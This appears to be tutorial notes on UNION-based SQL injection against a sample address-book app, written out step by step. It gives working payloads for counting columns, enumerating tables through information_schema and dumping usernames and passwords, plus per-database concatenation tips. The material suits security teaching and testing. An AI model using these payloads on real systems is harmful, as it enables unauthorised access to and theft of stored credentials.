# Extracting Useful Data

To extract meaningful data via SQL injection, the attacker typically needs to know the **names of relevant tables and columns**. Fortunately, all major database platforms expose rich **metadata schemas** that can be queried to enumerate the full structure of the database.

---

## Extracting Data with UNION

*Example scenario*:
- A user searches for "Matthew" in an address book app.
- POST request:
  ```
  Name=Matthew
  ```

- Server response:
  ```
  NAME              E-MAIL
  Matthew Adamson   handytrick@gmail.com
  ```

---

### **Step 1: Determine the Number of Columns**

- Initial test with one `NULL`:
  ```
  Name=Matthew' UNION SELECT NULL--
  ```

  >➤ **Error**: "All queries combined using a UNION... must have equal number of expressions..."

- Try increasing `NULL`s:
  ```
  Name=Matthew' UNION SELECT NULL,NULL,NULL,NULL,NULL--
  ```

  >➤ **Success**: An empty row is appended to the result table.

---

### **Step 2: Identify a String-Compatible Column**

- Test injection:
  ```
  Name=Matthew' UNION SELECT 'a',NULL,NULL,NULL,NULL--
  ```

  >➤ Result: `'a'` appears in the `NAME` column → indicates string support.

---

### **Step 3: Enumerate Tables and Columns**

- Inject query to retrieve schema metadata:
  ```sql
  Name=Matthew' UNION SELECT table_name, column_name, NULL, NULL, NULL FROM information_schema.columns--
  ```

  ➤ Sample output:
  ```
  NAME          E-MAIL
  shop_items    price
  shop_items    prodid
  shop_items    prodname
  addr_book     contactemail
  addr_book     contactname
  users         username
  users         password
  ```

---

### **Step 4: Extract Sensitive Data**

- Now that the `users` table is known, extract credentials:
  ```sql
  Name=Matthew' UNION SELECT username, password, NULL, NULL, NULL FROM users--
  ```

  ➤ Sample output:
  ```
  NAME          E-MAIL
  administrator fme69
  dev           uber
  marcus        8pinto
  smith         twosixty
  jlo           6kdown
  ```

---

## TIP: Platform-Specific Notes

* **Supported DBMS**: The `information_schema` is used by MS-SQL, MySQL, PostgreSQL, SQLite, etc.
* **Oracle equivalent**:
  - Full database:  
    ```sql
    SELECT table_name, column_name FROM all_tab_columns
    ```
  - Current user only:  
    ```sql
    SELECT table_name, column_name FROM user_tab_columns
    ```

---

## TIP: Search for Interesting Columns

- Rather than enumerating everything, focus on keywords:
  ```sql
  SELECT table_name, column_name 
  FROM information_schema.columns 
  WHERE column_name LIKE '%PASS%'
  ```

---

## TIP: Concatenate Columns for Easier Extraction

This simplifies extraction when only one string column is available in the response.

* **Oracle**:
  ```sql
  SELECT table_name || ':' || column_name FROM all_tab_columns
  ```

* **MS-SQL**:
  ```sql
  SELECT table_name + ':' + column_name FROM information_schema.columns
  ```

* **MySQL**:
  ```sql
  SELECT CONCAT(table_name, ':', column_name) FROM information_schema.columns
  ```
